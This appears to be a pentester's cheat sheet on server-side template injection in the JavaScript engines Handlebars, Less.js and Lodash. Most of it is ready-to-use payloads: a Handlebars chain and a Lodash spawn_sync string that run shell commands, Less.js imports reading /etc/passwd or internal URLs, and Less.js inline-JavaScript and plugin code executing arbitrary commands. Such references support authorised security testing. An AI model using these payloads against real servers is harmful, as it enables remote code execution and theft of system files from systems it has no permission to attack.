# Server Side Template Injection - JavaScript

## Summary

- [Handlebars](#handlebars)
    - [Handlebars - Command Execution](#handlebars---command-execution)
- [Lessjs](#lessjs)
    - [Lessjs - SSRF / LFI](#lessjs---ssrf--lfi)
    - [Lessjs < v3 - Command Execution](#lessjs--v3---command-execution)
    - [Lessjs Plugins](#lessjs-plugins)
- [Lodash](#Lodash)
    - [Lodash - Basic Injection](#lodash---basic-injection)
    - [Lodash - Command Execution](#lodash---command-execution)


## Handlebars

[Official website](https://handlebarsjs.com/)
> Handlebars compiles templates into JavaScript functions.

### Handlebars - Command Execution

```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('ls -la');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

---

## Lessjs

[Official website](https://lesscss.org/)
> Less (which stands for Leaner Style Sheets) is a backwards-compatible language extension for CSS. This is the official documentation for Less, the language and Less.js, the JavaScript tool that converts your Less styles to CSS styles.

### Lessjs - SSRF / LFI

```less
@import (inline) "http://localhost";
// or
@import (inline) "/etc/passwd";
```

### Lessjs < v3 - Command Execution

```less
body {
  color: `global.process.mainModule.require("child_process").execSync("id")`;
}
```

### Lessjs Plugins

Lessjs plugins can be remotely included and are composed of Javascript which gets executed when the Less is transpiled.

```less
// example local plugin usage
@plugin "plugin-2.7.js";
```
or
```less
// example remote plugin usage
@plugin "http://example.com/plugin-2.7.js"
```

version 2 example RCE plugin:

```javascript
functions.add('cmd', function(val) {
  return `"${global.process.mainModule.require('child_process').execSync(val.value)}"`;
});
```
version 3 and above example RCE plugin

```javascript
//Vulnerable plugin (3.13.1)
registerPlugin({
    install: function(less, pluginManager, functions) {
        functions.add('cmd', function(val) {
            return global.process.mainModule.require('child_process').execSync(val.value).toString();
        });
    }
})
```

---

## Lodash

[Official website](https://lodash.com/docs/4.17.15)

### Lodash - Basic Injection

How to create a template:

```javascript
const _ = require('lodash');
string = "{{= username}}"
const options = {
  evaluate: /\{\{(.+?)\}\}/g,
  interpolate: /\{\{=(.+?)\}\}/g,
  escape: /\{\{-(.+?)\}\}/g,
};

_.template(string, options);
```

- **string:** The template string.
- **options.interpolate:** It is a regular expression that specifies the HTML *interpolate* delimiter.
- **options.evaluate:** It is a regular expression that specifies the HTML *evaluate* delimiter.
- **options.escape:** It is a regular expression that specifies the HTML *escape* delimiter.

For the purpose of RCE, the delimiter of templates is determined by the **options.evaluate** parameter.

```javascript
{{= _.VERSION}}
${= _.VERSION}
<%= _.VERSION %>


{{= _.templateSettings.evaluate }}
${= _.VERSION}
<%= _.VERSION %>
```

### Lodash - Command Execution

```js
{{x=Object}}{{w=a=new x}}{{w.type="pipe"}}{{w.readable=1}}{{w.writable=1}}{{a.file="/bin/sh"}}{{a.args=["/bin/sh","-c","id;ls"]}}{{a.stdio=[w,w]}}{{process.binding("spawn_sync").spawn(a).output}}
```

---

